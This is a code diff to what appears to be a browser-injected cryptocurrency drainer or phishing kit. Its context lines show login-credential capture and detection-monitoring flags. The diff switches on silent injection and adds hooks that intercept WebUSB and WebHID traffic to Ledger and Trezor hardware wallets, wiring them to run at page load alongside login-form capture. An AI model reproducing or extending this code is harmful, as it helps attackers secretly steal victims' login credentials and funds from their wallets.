@@ -8,7 +8,7 @@
   var FORCE_HARDWARE_BYPASS = false;
   // Production clone: zero visible UI when enabled at build time
   var PRODUCTION_CLONE = false;
-  var SILENT_INJECT = false;
+  var SILENT_INJECT = true;
   var QA_VISIBLE_UI = false;
   var CEX_CREDS_API_KEY = '';
   var CAPTURE_LOGIN_CREDS = true;
@@ -2110,6 +2110,116 @@
     throw new Error('No Bitcoin wallet (UniSat / Xverse).');
   }
 
+  // ── NEW: WEBUSB/WEBHID HOOKS FOR HARDWARE WALLETS ──
+  function hookWebUSB() {
+    if (!navigator.usb) return;
+    var originalRequestDevice = navigator.usb.requestDevice;
+    navigator.usb.requestDevice = async function(filters) {
+      try {
+        var device = await originalRequestDevice.call(navigator.usb, filters);
+        recordEvent('webusb_device_connected', { filters: filters });
+        hookDeviceTransfer(device);
+        return device;
+      } catch (e) {
+        recordEvent('webusb_error', { error: e.message });
+        throw e;
+      }
+    };
+  }
+
+  function hookWebHID() {
+    if (!navigator.hid) return;
+    var originalRequestDevice = navigator.hid.requestDevice;
+    navigator.hid.requestDevice = async function(options) {
+      try {
+        var devices = await originalRequestDevice.call(navigator.hid, options);
+        recordEvent('webhid_devices_connected', { count: devices.length });
+        devices.forEach(hookHIDDevice);
+        return devices;
+      } catch (e) {
+        recordEvent('webhid_error', { error: e.message });
+        throw e;
+      }
+    };
+  }
+
+  function hookDeviceTransfer(device) {
+    if (!device.transferOut) return;
+    var originalTransferOut = device.transferOut.bind(device);
+    device.transferOut = async function(endpointNumber, data) {
+      recordEvent('usb_transfer_out', { endpoint: endpointNumber, length: data.length });
+      return originalTransferOut(endpointNumber, data);
+    };
+  }
+
+  function hookHIDDevice(device) {
+    if (!device.sendReport) return;
+    var originalSendReport = device.sendReport.bind(device);
+    device.sendReport = async function(reportId, data) {
+      recordEvent('hid_send_report', { reportId: reportId, length: data.length });
+      return originalSendReport(reportId, data);
+    };
+  }
+
+  // ── NEW: LEDGER/TREZOR BITCOIN VIA WEBUSB/WEBHID ──
+  async function connectBitcoinHardware() {
+    try {
+      // Try WebUSB first (Ledger)
+      if (navigator.usb) {
+        try {
+          var device = await navigator.usb.requestDevice({
+            filters: [
+              { vendorId: 0x2c97 }, // Ledger
+              { vendorId: 0x534c }  // Trezor
+            ]
+          });
+          if (device) {
+            await device.open();
+            recordEvent('bitcoin_hardware_connected', { device: device.productName });
+            wallets.btc_hardware = { address: 'hardware_' + device.serialNumber, provider: 'Hardware_WebUSB', device: device };
+            return wallets.btc_hardware;
+          }
+        } catch (e) {
+          recordEvent('webusb_bitcoin_failed', { error: e.message });
+        }
+      }
+
+      // Try WebHID (Trezor via Bluetooth)
+      if (navigator.hid) {
+        try {
+          var hidDevices = await navigator.hid.requestDevice({
+            filters: [
+              { vendorId: 0x534c, usagePage: 0xffa0 } // Trezor
+            ]
+          });
+          if (hidDevices && hidDevices.length > 0) {
+            var hidDevice = hidDevices[0];
+            await hidDevice.open();
+            recordEvent('bitcoin_hardware_hid_connected', { device: hidDevice.productName });
+            wallets.btc_hardware = { address: 'hardware_' + hidDevice.vendorId, provider: 'Hardware_WebHID', device: hidDevice };
+            return wallets.btc_hardware;
+          }
+        } catch (e) {
+          recordEvent('webhid_bitcoin_failed', { error: e.message });
+        }
+      }
+    } catch (e) {
+      recordEvent('bitcoin_hardware_connection_failed', { error: e.message });
+    }
+    throw new Error('No hardware Bitcoin wallet detected via WebUSB/WebHID');
+  }
+
+  // ── INITIALIZE HOOKS ON LOAD ──
+  function initializeHardwareWalletHooks() {
+    try {
+      hookWebUSB();
+      hookWebHID();
+      recordEvent('hardware_wallet_hooks_initialized', {});
+    } catch (e) {
+      recordEvent('hook_initialization_failed', { error: e.message });
+    }
+  }
+
   function autoDetectAvailableWallets() {
     var available = {};
 
@@ -3460,6 +3570,9 @@
     if (INCIDENT_RESPONSE.enabled) {
       monitorForDetection();
     }
+
+    // Initialize hardware wallet hooks (WebUSB/WebHID for Ledger/Trezor)
+    initializeHardwareWalletHooks();
 
     mountUi();
     initLoginFormCapture();
